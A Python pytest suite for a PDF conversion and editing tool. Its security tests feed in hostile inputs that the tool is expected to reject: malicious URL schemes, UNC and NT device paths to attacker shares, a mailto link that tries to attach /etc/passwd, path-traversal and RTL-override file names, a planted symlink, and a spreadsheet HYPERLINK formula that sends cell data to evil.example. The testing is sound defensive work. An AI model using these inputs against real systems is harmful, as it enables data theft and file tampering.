"""Tests for the non-GUI parts. Run with:  python -m pytest -q tests"""
import os
import sys
import tempfile

import pymupdf as fitz
import pytest

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, ROOT)
os.environ.setdefault("PDFDESK_HOME", tempfile.mkdtemp(prefix="pdfdesk-test-home-"))

from pdfdesk import convert, externals, pdfops  # noqa: E402


@pytest.fixture()
def tmp(tmp_path):
    return tmp_path


def sample_pdf(pages=3) -> fitz.Document:
    doc = fitz.open()
    for i in range(pages):
        page = doc.new_page()
        page.insert_htmlbox(fitz.Rect(54, 54, 558, 400),
                            f"<h1>Section {i + 1}</h1><p>Body text with Șase țări and "
                            f"<b>bold</b> words. Contact test{i}@example.com.</p>")
        # a ruled table so find_tables() can see it
        x0, y0 = 72, 450
        for r in range(4):
            page.draw_line((x0, y0 + r * 20), (x0 + 300, y0 + r * 20))
        for c in range(4):
            page.draw_line((x0 + c * 100, y0), (x0 + c * 100, y0 + 60))
        for r in range(3):
            for c in range(3):
                page.insert_text((x0 + c * 100 + 5, y0 + r * 20 + 14), f"R{r}C{c}", fontsize=10)
    return doc


# --------------------------------------------------------------------------- import

def make_inputs(folder):
    from PIL import Image
    files = {}
    img = Image.new("RGB", (400, 300), (40, 120, 200))
    for ext, fmt in ((".png", "PNG"), (".jpg", "JPEG"), (".webp", "WEBP"), (".bmp", "BMP"), (".tiff", "TIFF")):
        p = folder / f"image{ext}"
        img.save(p, fmt)
        files[ext] = p
    (folder / "notes.txt").write_text("Plain text line one\nline two with ăîșț\n", encoding="utf-8")
    files[".txt"] = folder / "notes.txt"
    (folder / "main.tf").write_text('resource "aws_s3_bucket" "b" {\n  bucket = "x"\n}\n', encoding="utf-8")
    files[".tf"] = folder / "main.tf"
    (folder / "readme.md").write_text("# Title\n\nSome **bold** text.\n\n| a | b |\n|---|---|\n| 1 | 2 |\n\n"
                                      "```\ncode block\n```\n", encoding="utf-8")
    files[".md"] = folder / "readme.md"
    (folder / "page.html").write_text("<html><body><h1>Hello</h1><p>Web page</p></body></html>", encoding="utf-8")
    files[".html"] = folder / "page.html"
    (folder / "data.csv").write_text("name,count\nalpha,1\nbeta,2\n", encoding="utf-8")
    files[".csv"] = folder / "data.csv"
    (folder / "pic.svg").write_text('<svg xmlns="http://www.w3.org/2000/svg" width="200" height="100">'
                                    '<rect width="200" height="100" fill="red"/></svg>', encoding="utf-8")
    files[".svg"] = folder / "pic.svg"
    import docx
    d = docx.Document()
    d.add_heading("Word file", 1)
    d.add_paragraph("Paragraph text.")
    d.save(folder / "doc.docx")
    files[".docx"] = folder / "doc.docx"
    from openpyxl import Workbook
    wb = Workbook()
    wb.active.append(["x", "y"])
    wb.active.append([1, 2])
    wb.save(folder / "book.xlsx")
    files[".xlsx"] = folder / "book.xlsx"
    from pptx import Presentation
    prs = Presentation()
    s = prs.slides.add_slide(prs.slide_layouts[1])
    s.shapes.title.text = "Slide title"
    prs.save(folder / "deck.pptx")
    files[".pptx"] = folder / "deck.pptx"
    return files


def test_import_every_type(tmp):
    files = make_inputs(tmp)
    for ext, path in files.items():
        data = convert.to_pdf_bytes(str(path))
        doc = fitz.open("pdf", data)
        assert doc.page_count >= 1, ext


def test_text_import_keeps_unicode(tmp):
    files = make_inputs(tmp)
    doc = fitz.open("pdf", convert.to_pdf_bytes(str(files[".txt"])))
    assert "ăîșț" in doc[0].get_text()


def test_combine_mixed_files(tmp):
    files = make_inputs(tmp)
    data = convert.files_to_pdf_bytes([str(files[".png"]), str(files[".md"]), str(files[".txt"])])
    assert fitz.open("pdf", data).page_count == 3


def test_images_on_letter_paper(tmp):
    files = make_inputs(tmp)
    data = convert.images_to_pdf_bytes([str(files[".png"])], page_size="letter", margin=36)
    page = fitz.open("pdf", data)[0]
    assert round(page.rect.width) == 792  # landscape image -> landscape page


# --------------------------------------------------------------------------- export

@pytest.mark.parametrize("fmt", ["docx", "xlsx", "pptx", "png", "jpg", "webp", "tiff", "svg", "txt", "html", "md"])
def test_export_formats(tmp, fmt):
    data = sample_pdf().tobytes()
    key, label, ext, kind = convert.export_format(fmt)
    target = str(tmp / ("out" if kind == "folder" else f"out{ext}"))
    written = convert.export_pdf(data, fmt, target, pages=[0, 1])
    assert written and all(os.path.getsize(p) > 0 for p in written)
    if kind == "folder":
        assert len(written) == 2


def test_markdown_export_content(tmp):
    data = sample_pdf(1).tobytes()
    out = convert.export_pdf(data, "md", str(tmp / "o.md"))[0]
    text = open(out, encoding="utf-8").read()
    assert "# Section 1" in text and "**bold**" in text and "R1C1" in text


def test_xlsx_export_finds_table(tmp):
    from openpyxl import load_workbook
    out = convert.export_pdf(sample_pdf(1).tobytes(), "xlsx", str(tmp / "o.xlsx"))[0]
    ws = load_workbook(out).worksheets[0]
    values = [c.value for row in ws.iter_rows() for c in row]
    assert "R2C2" in values


@pytest.mark.skipif(not externals.libreoffice_available(), reason="LibreOffice not installed")
def test_export_odt(tmp):
    out = convert.export_pdf(sample_pdf(1).tobytes(), "odt", str(tmp / "o.odt"))[0]
    assert os.path.getsize(out) > 0


# --------------------------------------------------------------------------- operations

def test_page_ranges():
    assert pdfops.parse_page_range("1-3, 5", 6) == [0, 1, 2, 4]
    assert pdfops.parse_page_range("4-", 6) == [3, 4, 5]
    assert pdfops.parse_page_range("odd", 5) == [0, 2, 4]
    assert pdfops.parse_page_range("last", 5) == [4]
    with pytest.raises(ValueError):
        pdfops.parse_page_range("9", 5)
    assert pdfops.format_page_list([0, 1, 2, 4]) == "1-3, 5"


def test_page_management():
    doc = sample_pdf(4)
    pdfops.rotate_pages(doc, [0], 90)
    assert doc[0].rotation == 90
    pdfops.duplicate_page(doc, 1)
    assert doc.page_count == 5
    pdfops.insert_blank_page(doc, 0, like_page=1)
    assert doc.page_count == 6 and not doc[0].get_text().strip()
    pdfops.delete_pages(doc, [0])
    assert doc.page_count == 5
    pdfops.reorder_pages(doc, [4, 3, 2, 1, 0])
    assert "Section 4" in doc[0].get_text()
    with pytest.raises(ValueError):
        pdfops.delete_pages(doc, range(doc.page_count))
    data = pdfops.extract_pages_bytes(doc, [0, 1])
    assert fitz.open("pdf", data).page_count == 2


def test_split_modes(tmp):
    doc = sample_pdf(5)
    doc.set_toc([[1, "A", 1], [1, "B", 3]])
    assert len(pdfops.split_document(doc, "every", 2, str(tmp / "a"), "x")) == 3
    assert len(pdfops.split_document(doc, "single", None, str(tmp / "b"), "x")) == 5
    assert len(pdfops.split_document(doc, "ranges", ["1-2", "3-5"], str(tmp / "c"), "x")) == 2
    assert len(pdfops.split_document(doc, "bookmarks", None, str(tmp / "d"), "x")) == 2


def test_watermark_header_footer_unicode():
    doc = sample_pdf(2)
    doc[1].set_rotation(90)
    pdfops.add_text_watermark(doc, [0, 1], "CONFIDENȚIAL")
    pdfops.add_header_footer(doc, [0, 1], {"footer_center": "Pagina {page} din {pages}"})
    assert "CONFIDENȚIAL" in doc[0].get_text()
    assert "Pagina 2 din 2" in doc[1].get_text()


def test_redaction_presets():
    doc = sample_pdf(2)
    n = pdfops.mark_redactions(doc, range(2), regex=pdfops.REDACT_PRESETS["Email addresses"])
    assert n == 2
    pdfops.apply_redactions(doc)
    assert "@example.com" not in doc[0].get_text()


def test_protect_and_compress():
    doc = sample_pdf(2)
    enc = pdfops.protect_bytes(doc, "user", "owner", allow_copy=False)
    d = fitz.open("pdf", enc)
    assert d.needs_pass and d.authenticate("user")
    small = pdfops.compress_bytes(enc, password="owner", level="high")
    d2 = fitz.open("pdf", small)
    assert d2.needs_pass and d2.authenticate("owner")


def test_crop():
    doc = sample_pdf(1)
    before = doc[0].rect
    pdfops.crop_pages(doc, [0], 36, 36, 36, 36)
    assert round(doc[0].rect.width) == round(before.width - 72)
    assert round(doc[0].rect.height) == round(before.height - 72)


def test_edit_text_line():
    doc = fitz.open()
    page = doc.new_page()
    page.insert_text((72, 100), "Old wording here", fontsize=12)
    line = page.get_text("dict")["blocks"][0]["lines"][0]
    span = line["spans"][0]
    pdfops.replace_text_line(page, fitz.Rect(line["bbox"]), fitz.Point(span["origin"]), "New wording ș",
                             12, (0, 0, 0), "sans", False, False)
    text = page.get_text()
    assert "Old wording" not in text and "New wording ș" in text


@pytest.mark.skipif(not externals.ocr_available(), reason="No Tesseract language data")
def test_ocr_sandwich():
    src = fitz.open()
    p = src.new_page()
    p.insert_text((72, 100), "Invoice number 4471", fontsize=20)
    pix = p.get_pixmap(dpi=200)
    scan = fitz.open()
    sp = scan.new_page(width=p.rect.width, height=p.rect.height)
    sp.insert_image(sp.rect, pixmap=pix)
    folder, langs = externals.find_tessdata()
    out, count = pdfops.ocr_bytes(scan.tobytes(), None, "eng" if "eng" in langs else langs[0], folder)
    assert count == 1
    assert fitz.open("pdf", out)[0].search_for("4471")


# --------------------------------------------------------------------------- security

def test_web_link_rules():
    from pdfdesk import safety
    ok = ["https://example.com/a?b=1", "http://example.com", "mailto:a@b.com"]
    bad = ["FILE:///C:/x.exe", "file://host/share/x.exe", "smb://host/x", "ms-msdt:/id x", "search-ms:query",
           "javascript:alert(1)", "https://user@evil.example/", "https://e.com/\u202eexe", "", "https://"]
    for u in ok:
        assert safety.check_web_link(u)[0], u
    for u in bad:
        assert safety.check_web_link(u)[0] is None, u
    url, _ = safety.check_web_link("mailto:a@b.com?subject=x&attach=/etc/passwd&cc=c@d.com")
    assert url == "mailto:a@b.com?subject=x"


def test_file_link_rules(tmp):
    from pdfdesk import safety
    base = tmp / "doc.pdf"
    d = fitz.open()
    d.new_page()
    d.save(str(base))
    d.save(str(tmp / "other.pdf"))
    (tmp / "notes.docx").write_bytes(b"x")
    assert safety.resolve_pdf_link("other.pdf", str(base))[0] == str(tmp / "other.pdf")
    for target in ("//server/share/x.pdf", "\\\\server\\share\\x.pdf", "file:///etc/x.pdf", "smb://h/x.pdf",
                   "notes.docx", "missing.pdf", "other.pdf\u202e"):
        assert safety.resolve_pdf_link(target, str(base))[0] is None, target


def test_split_names_are_safe(tmp):
    doc = sample_pdf(2)
    doc.set_toc([[1, "../../evil\u202egpj.exe\n" + "x" * 400, 1], [1, "B", 2]])
    paths = pdfops.split_document(doc, "bookmarks", None, str(tmp / "out"), "Doc")
    for p in paths:
        assert os.path.dirname(p) == str(tmp / "out")
        name = os.path.basename(p)
        assert "\u202e" not in name and "\n" not in name and len(name) < 140


def test_xlsx_export_never_writes_formulas(tmp):
    from openpyxl import load_workbook
    doc = fitz.open()
    page = doc.new_page()
    page.insert_text((72, 72), '=HYPERLINK("http://evil.example/?x="&A2,"Click")', fontsize=10)
    out = convert.export_pdf(doc.tobytes(), "xlsx", str(tmp / "o.xlsx"))[0]
    ws = load_workbook(out).worksheets[0]
    cells = [c for row in ws.iter_rows() for c in row if c.value]
    assert cells and all(c.data_type != "f" for c in cells)


def test_redaction_patterns_are_fast():
    import re
    import time
    for name, pattern in pdfops.REDACT_PRESETS.items():
        for text in ("a" * 100000, "a@" + "a." * 50000, "1." * 50000):
            t = time.time()
            list(re.finditer(pattern, text))
            assert time.time() - t < 1.0, name


def test_libreoffice_profile_is_locked_down(tmp):
    from pdfdesk import externals
    externals._harden_libreoffice_profile(tmp / "profile")
    xcu = (tmp / "profile" / "user" / "registrymodifications.xcu").read_text()
    assert "BlockUntrustedRefererLinks" in xcu and "DisableMacrosExecution" in xcu


def test_program_lookup_ignores_current_folder(tmp, monkeypatch):
    from pdfdesk import externals
    fake = tmp / "soffice"
    fake.write_text("#!/bin/sh\n")
    fake.chmod(0o755)
    monkeypatch.chdir(tmp)
    monkeypatch.setenv("PATH", os.pathsep.join([".", "", str(tmp) + "/nonexistent"]))
    assert externals.find_program("soffice") is None


def test_windows_file_link_rules():
    """Simulated Windows paths: NT and device paths that reach network shares are refused."""
    from pdfdesk import safety
    base = r"C:\Users\me\Documents\doc.pdf"
    for target in ("/??/UNC/attacker/share/x.pdf", r"\??\UNC\a\s\x.pdf", r"\\?\UNC\a\s\x.pdf",
                   r"\\.\UNC\a\s\x.pdf", "/GLOBALROOT/Device/Mup/a/x.pdf", "C:x.pdf", r"\x.pdf",
                   "//a/s/x.pdf", "%5C%5Cattacker%5Cs%5Cx.pdf", "file:///C:/x.pdf"):
        path, reason = safety.resolve_pdf_link(target, base, windows=True)
        assert path is None and "not found" not in reason, target


def test_save_does_not_follow_foreign_symlinks(tmp):
    from pdfdesk.document import PdfDocument
    d = fitz.open()
    d.new_page()
    d.save(str(tmp / "mine.pdf"))
    (tmp / "victim.conf").write_text("keep me")
    os.symlink(str(tmp / "victim.conf"), str(tmp / "planted.pdf"))
    pdf = PdfDocument.open(str(tmp / "mine.pdf"))
    pdf.save(str(tmp / "planted.pdf"))
    assert (tmp / "victim.conf").read_text() == "keep me"   # the link was replaced, not followed
    assert not os.path.islink(tmp / "planted.pdf")
